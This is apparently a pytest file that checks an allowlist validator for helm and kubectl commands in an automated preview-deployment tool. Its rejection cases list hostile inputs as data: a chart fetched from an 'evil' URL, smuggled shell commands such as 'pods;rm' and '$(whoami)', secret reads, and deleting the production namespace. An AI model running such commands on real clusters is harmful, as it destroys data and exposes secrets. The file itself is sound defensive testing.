from __future__ import annotations

import subprocess

import pytest

from aiops.commands import (
    PREVIEW_DESTROY_POLICY,
    PREVIEW_POLICY,
    ROLLBACK_POLICY,
    Command,
    execute,
    validate_command,
    validate_plan,
)

NS = "preview-feature-x"
CHART = "deploy/helm/idea-board"


def upgrade(*extra: str, ns: str = NS) -> Command:
    return Command(("helm", "upgrade", "--install", "idea-board-feature-x", CHART, "-n", ns, *extra))


def test_baseline_upgrade_is_valid() -> None:
    cmd = upgrade(
        "--create-namespace",
        "-f",
        "deploy/helm/idea-board/values-preview.yaml",
        "--set",
        "backend.image.tag=abc123",
        "--wait",
        "--timeout",
        "5m",
    )
    assert validate_command(cmd, PREVIEW_POLICY, NS) == []


@pytest.mark.parametrize(
    ("argv", "expected"),
    [
        (("bash", "-c", "rm"), "not allowlisted"),
        (("kubectl", "apply", "-f", "x.yaml", "-n", NS), "not allowlisted"),
        (("kubectl", "exec", "pod", "-n", NS), "not allowlisted"),
        (("kubectl", "get", "secrets", "-n", NS), "secrets"),
        (("kubectl", "get", "pods", "-n", "kube-system"), "differs from the expected"),
        (("kubectl", "get", "pods", "-A"), "forbidden"),
        (("kubectl", "get", "pods", "-n", NS, "--context", "prod"), "forbidden"),
        (
            ("helm", "upgrade", "--install", "idea-board-feature-x", "https://evil/chart.tgz", "-n", NS),
            "not an allowlisted local chart",
        ),
        (
            ("helm", "upgrade", "--install", "idea-board-feature-x", "bitnami/redis", "-n", NS),
            "not an allowlisted local chart",
        ),
        (("helm", "upgrade", "idea-board-feature-x", CHART, "-n", NS), "--install"),
        (("helm", "upgrade", "--install", "other-app", CHART, "-n", NS), "release 'other-app'"),
        (("helm", "uninstall", "idea-board-feature-x", "-n", NS), "not permitted"),
        (("helm", "rollback", "idea-board-feature-x", "-n", NS), "not permitted"),
        (("kubectl", "delete", "namespace", NS), "not permitted"),
        (("kubectl", "get", "pods;rm", "-n", NS), "forbidden characters"),
        (("kubectl", "get", "pods", "-n", "$(whoami)"), "forbidden characters"),
        (("kubectl", "get", "pods", "-n", NS, "--token=abc"), "forbidden"),
    ],
)
def test_dangerous_commands_are_rejected(argv: tuple[str, ...], expected: str) -> None:
    errors = validate_command(Command(argv), PREVIEW_POLICY, NS)
    assert errors, f"{argv} should be rejected"
    assert any(expected in e for e in errors), errors


@pytest.mark.parametrize(
    ("kv", "ok"),
    [
        ("backend.replicaCount=2", True),
        ("ingress.host=feature-x.preview.ideaboard.localhost", True),
        ("database.existingSecret=prod-db", False),  # key not allowlisted
        ("backend.image.tag=a,frontend.image.tag=b", False),  # multi-set smuggling
        ("networkPolicy.enabled=false", False),
    ],
)
def test_set_keys_are_allowlisted(kv: str, ok: bool) -> None:
    errors = validate_command(upgrade("--set", kv), PREVIEW_POLICY, NS)
    assert (errors == []) is ok, errors


def test_values_files_are_allowlisted() -> None:
    errors = validate_command(upgrade("-f", "deploy/helm/idea-board/values-production.yaml"), PREVIEW_POLICY, NS)
    assert any("values file" in e for e in errors)


def test_preview_policy_never_touches_production() -> None:
    errors = validate_command(upgrade(ns="production"), PREVIEW_POLICY, "production")
    assert any("not allowlisted" in e for e in errors)


def test_destroy_policy_allows_only_the_expected_namespace() -> None:
    ok = Command(("kubectl", "delete", "namespace", NS))
    assert validate_command(ok, PREVIEW_DESTROY_POLICY, NS) == []
    bad = Command(("kubectl", "delete", "namespace", "staging"))
    assert validate_command(bad, PREVIEW_DESTROY_POLICY, NS)
    assert (
        validate_command(Command(("helm", "uninstall", "idea-board-feature-x", "-n", NS)), PREVIEW_DESTROY_POLICY, NS)
        == []
    )
    # destroy policy cannot install
    assert validate_command(upgrade(), PREVIEW_DESTROY_POLICY, NS)


def test_rollback_policy() -> None:
    cmd = Command(("helm", "rollback", "idea-board", "3", "-n", "staging", "--wait", "--timeout", "5m"))
    assert validate_command(cmd, ROLLBACK_POLICY, "staging") == []
    assert validate_command(
        Command(("helm", "rollback", "idea-board", "x", "-n", "staging")), ROLLBACK_POLICY, "staging"
    )
    assert validate_command(upgrade(ns="staging"), ROLLBACK_POLICY, "staging")


def test_plan_size_limits() -> None:
    assert validate_plan([], PREVIEW_POLICY, NS) == ["plan has no steps"]
    many = [Command(("kubectl", "get", "pods", "-n", NS))] * 9
    assert validate_plan(many, PREVIEW_POLICY, NS) == ["plan has more than 8 steps"]


def test_execute_refuses_invalid_plan_and_never_runs_anything() -> None:
    calls: list[list[str]] = []

    def runner(argv: list[str]) -> subprocess.CompletedProcess[str]:
        calls.append(argv)
        return subprocess.CompletedProcess(argv, 0, "", "")

    with pytest.raises(PermissionError):
        execute(
            [Command(("kubectl", "delete", "namespace", "production"))], PREVIEW_POLICY, NS, "kind-x", runner=runner
        )
    assert calls == []


def test_execute_injects_context_and_stops_on_failure() -> None:
    calls: list[list[str]] = []

    def runner(argv: list[str]) -> subprocess.CompletedProcess[str]:
        calls.append(argv)
        return subprocess.CompletedProcess(argv, 1 if len(calls) == 1 else 0, "", "boom")

    plan = [upgrade(), Command(("kubectl", "get", "pods", "-n", NS))]
    results = execute(plan, PREVIEW_POLICY, NS, "kind-idea-board", runner=runner, echo=lambda _: None)
    assert len(results) == 1 and results[0].returncode == 1
    assert calls[0][:3] == ["helm", "--kube-context", "kind-idea-board"]


def test_execute_dry_run() -> None:
    results = execute(
        [Command(("kubectl", "get", "pods", "-n", NS))], PREVIEW_POLICY, NS, "kind-x", dry_run=True, echo=lambda _: None
    )
    assert results[0].command.startswith("kubectl --context kind-x get pods")
